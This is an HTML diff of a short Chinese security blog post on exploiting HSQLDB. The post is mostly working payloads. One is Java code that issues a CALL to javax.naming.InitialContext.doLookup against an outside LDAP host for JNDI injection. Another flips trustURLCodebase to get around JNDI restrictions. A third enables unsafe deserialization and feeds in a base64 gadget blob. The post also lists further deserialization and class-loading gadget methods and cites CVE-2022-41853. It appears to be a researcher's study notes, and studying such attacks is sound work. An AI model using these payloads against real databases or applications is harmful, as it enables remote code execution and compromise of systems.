@@ -9,7 +9,7 @@
     
     <title>
         
-            404 |
+            hsql |
         
         1diot9&#39;s Blog
     </title>
@@ -229,15 +229,266 @@
             <div class="main-content border-box">
                 
 
-                    <div class="fade-in-down-animation">
-    <div class="error-404-container border-box">
-        <div class="text-1 border-box flex-center">404</div>
-        <div class="text-2 border-box flex-center">
-            页面找不到
+                    
+<div class="fade-in-down-animation">
+    <div class="post-page-container border-box">
+        <div class="post-content-container border-box">
+            
+
+            <div class="post-content-bottom border-box">
+                
+                    <div class="post-title">
+                        hsql
+                    </div>
+                
+
+                
+                    <div class="post-header border-box">
+                        
+                            <div class="avatar-box border-box">
+                                <img src="/images/baka.png">
+                            </div>
+                        
+                        <div class="info-box">
+                            <div class="author border-box">
+                                <span class="name">1diot9</span>
+                                
+                                    <span class="author-badge">Lv2</span>
+                                
+                            </div>
+                            <div class="meta-info border-box">
+                                
+
+<div class="post-meta-info-container border-box post">
+    <div class="post-meta-info border-box">
+        
+
+        
+            <span class="meta-info-item post-create-date">
+                <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
+                <span class="datetime">2025-05-05 20:08:50</span>
+            </span>
+
+            
+                <span class="meta-info-item post-update-date">
+                    <i class="icon fa-solid fa-file-pen"></i>&nbsp;
+                    <span class="datetime" data-updated="Mon May 05 2025 20:09:17 GMT+0800">2025-05-05 20:09:17</span>
+                </span>
+            
+        
+
+        
+            <span class="meta-info-item post-category border-box"><i class="icon fas fa-folder"></i>&nbsp;
+                <ul class="post-category-ul">
+                    
+                            <li class="category-item"><a href="/categories/Java%E5%AE%89%E5%85%A8/">Java安全</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+            <span class="post-tag meta-info-item border-box">
+                <ul class="post-tag-ul">
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/Java%E5%AE%89%E5%85%A8/">Java安全</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+        
+            <span class="meta-info-item post-wordcount">
+                <i class="icon fas fa-file-word"></i>&nbsp;<span>424 字</span>
+            </span>
+        
+        
+            <span class="meta-info-item post-min2read">
+                <i class="icon fas fa-clock"></i>&nbsp;<span>1 分钟</span>
+            </span>
+        
+        
+            <span class="meta-info-item post-pv">
+                <i class="icon fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+            </span>
+        
+    </div>
+
+    
+</div>
+
+                            </div>
+                        </div>
+                    </div>
+                
+
+                <div class="post-content keep-markdown-body ">
+                    
+
+                    
+                         <p>直接看例子吧：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, SQLException &#123;</span><br><span class="line">        Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;org.hsqldb.jdbc.JDBCDriver&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">dburl</span> <span class="operator">=</span> <span class="string">&quot;jdbc:hsqldb:mem&quot;</span>;</span><br><span class="line">        <span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> DriverManager.getConnection(dburl, <span class="string">&quot;sa&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">        connection.prepareStatement(<span class="string">&quot;CALL \&quot;javax.naming.InitialContext.doLookup\&quot;(&#x27;ldap://192.168.126.1:1389/0r1wr1&#x27;)&quot;</span>).executeQuery();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>漏洞原因是，hsql查询时可以调用任意public static 方法。上面的就是调用doLookup，实现JNDI注入。</p>
+<p>在高版本下，JNDI可能被禁用，这时候也可以通过重新覆盖字段来绕过：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CALL java.lang.System.setProperty<span class="string">&quot;(&#x27;com.sun.jndi.ldap.object.trustURLCodebase&#x27;,&#x27;true&#x27;) + &quot;</span>javax.naming.InitialContext.doLookup<span class="string">&quot;(&#x27;ldap://127.0.0.1:4444/pgesux&#x27;)</span></span><br></pre></td></tr></table></figure>
+
+<p>当然，如果找到了类似deserialize等二次反序列化的函数，也可以直接用，payload类似：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CALL</span> &quot;java.lang.System.setProperty&quot;(<span class="string">&#x27;org.apache.commons.collections.enableUnsafeSerialization&#x27;</span>,<span class="string">&#x27;true&#x27;</span>) <span class="operator">+</span> &quot;org.apache.commons.lang.SerializationUtils.deserialize&quot;(&quot;org.apache.logging.log4j.core.config.plugins.convert.Base64Converter.parseBase64Binary&quot;(<span class="string">&#x27;rO0A....&#x27;</span>))</span><br></pre></td></tr></table></figure>
+
+<p>下面记录一下可以用的二次反序列化函数。</p>
+<p>spring-core:org.springframework.util.ReflectUtils#defineClass	字节码加载</p>
+<p>org.springframework.util.SerializationUtils.deserialize	二次反序列化</p>
+<p>下面两个在5版本的hsql中测试失败，3、4版本的没测试：</p>
+<p>CALL org.hsqldb.util.ScriptTool.main</p>
+<p>org.hsqldb.lib.InOutUtil.deserialize</p>
+<p>另外，hsql还可以结合druid来扩大攻击面，实现jndi到jdbc攻击。这里面利用的是druid里的一个工厂类。利用这个工程类，能够实现高版本jndi+jdbc攻击。</p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a class="link"   target="_blank" rel="noopener" href="https://b1ue.cn/archives/458.html" >HSQLDB 安全测试指南 - 浅蓝 ‘s blog<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://cn-sec.com/archives/2241357.html" >CVE-2022-41853 分析：通过 Java 反序列化和远程代码库攻击使用静态函数获取 RCE | CN-SEC 中文网<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/news/9675?time__1311=eqjx0ii=wxuieDsIBDCqGIKD5GQE=+==fxx&u_atoken=84b45aa797c8727efa1d1b1f6c089258&u_asig=0a472f8317438258657761125e0048" >关于hsqldb反序列化漏洞的一些思考-先知社区<i class="fas fa-external-link-alt"></i></a></p>
+
+                    
+                </div>
+
+                
+                        
+<div class="post-copyright-info-container border-box">
+    <div class="copyright-info-content border-box">
+        <div class="copyright-info-top border-box">
+            <div class="copyright-post-title border-box text-ellipsis">
+                hsql
+            </div>
+
+            <div class="copyright-post-link border-box text-ellipsis">
+                2025/05/05/hsql/
+            </div>
         </div>
-        <div class="text-3 border-box flex-center">
-            <a class="go-home" href="/">前往首页</a>
+
+        <div class="copyright-info-bottom border-box">
+            <div class="copyright-post-author bottom-item">
+                <div class="type">
+                    作者
+                </div>
+                <div class="content">1diot9</div>
+            </div>
+
+            <div class="post-time bottom-item">
+                <div class="type">
+                    发布于
+                </div>
+                <div class="content">2025-05-05 20:08</div>
+            </div>
+
+
+            <div class="post-license bottom-item">
+                <div class="type">
+                    许可
+                </div>
+                <div class="content tooltip" data-tooltip-content="CC BY-NC-SA 4.0">
+                    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh-hans" target="_blank">
+                        
+                            <i class="fa-brands fa-creative-commons"></i>
+                            <i class="fa-brands fa-creative-commons-by"></i>
+                            <i class="fa-brands fa-creative-commons-nc"></i>
+                            <i class="fa-brands fa-creative-commons-sa"></i>
+                        
+                    </a>
+                </div>
+            </div>
         </div>
+
+        <i class="copyright-bg fa-solid fa-copyright"></i>
+    </div>
+    <div class="copy-copyright-info flex-center tooltip" data-tooltip-content="复制版权信息" data-tooltip-offset-y="-2px">
+        <i class="fa-solid fa-copy"></i>
+    </div>
+</div>
+
+                
+
+                <div class="post-bottom-tags-and-share border-box">
+                    <div>
+                        
+                            <ul class="post-tags-box border-box">
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/Java%E5%AE%89%E5%85%A8/">Java安全</a>
+                                    </li>
+                                
+                            </ul>
+                        
+                    </div>
+                    <div>
+                        
+                    </div>
+                </div>
+
+                
+
+                
+                    <div class="post-nav border-box">
+                        
+                            <div class="prev-post">
+                                <a class="prev"
+                                   rel="prev"
+                                   href="/2025/05/05/postgreSQL/"
+                                   title="postgreSQL"
+                                >
+                                    <span class="left arrow-icon flex-center">
+                                        <i class="fas fa-chevron-left"></i>
+                                    </span>
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">postgreSQL</span>
+                                        <span class="post-nav-item">上一篇</span>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                        
+                            <div class="next-post">
+                                <a class="next"
+                                   rel="next"
+                                   href="/2025/05/05/sqlite%E6%94%BB%E5%87%BB/"
+                                   title="sqlite攻击"
+                                >
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">sqlite攻击</span>
+                                        <span class="post-nav-item">下一篇</span>
+                                    </span>
+                                    <span class="right arrow-icon flex-center">
+                                        <i class="fas fa-chevron-right"></i>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                    </div>
+                
+
+                
+                    
+
+
+
+
+
+
+                
+            </div>
+        </div>
+
+        
+            <div class="pc-post-toc right-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">1.</span> <span class="nav-text">参考</span></a></li></ol>
+    </div>
+</div>
+
+            </div>
+        
     </div>
 </div>
 
@@ -302,6 +553,31 @@
 
     <!-- post tools -->
     
+        <div class="post-tools right-toc">
+            <div class="post-tools-container border-box">
+    <ul class="post-tools-list border-box">
+        <!-- PC encrypt again -->
+        
+
+        <!-- PC TOC show toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        <!-- PC go comment -->
+        
+
+        <!-- PC full screen -->
+        <li class="tools-item flex-center full-screen">
+            <i class="fa-solid fa-expand"></i>
+        </li>
+    </ul>
+</div>
+
+        </div>
+    
 
     <!-- side tools -->
     <div class="side-tools">
@@ -332,6 +608,10 @@
     </ul>
 
     <ul class="exposed-tools-list border-box">
+        
+            <li class="tools-item toggle-show-toc-tablet flex-center">
+                <i class="fas fa-list"></i>
+            </li>
         
 
         
@@ -389,6 +669,17 @@
 
     <!-- tablet toc -->
     
+        <div class="tablet-post-toc-mask">
+            <div class="tablet-post-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">1.</span> <span class="nav-text">参考</span></a></li></ol>
+    </div>
+</div>
+
+            </div>
+        </div>
+    
 </main>
 
 
@@ -427,6 +718,28 @@
     
 
     <!-- post page -->
+    
+        <!-- post-helper -->
+        
+<script src="/js/post/post-helper.js"></script>
+
+
+        <!-- toc -->
+        
+            
+<script src="/js/post/toc.js"></script>
+
+        
+
+        <!-- copyright-info -->
+        
+            
+<script src="/js/post/copyright-info.js"></script>
+
+        
+
+        <!-- share -->
+        
     
 
     <!-- categories page -->
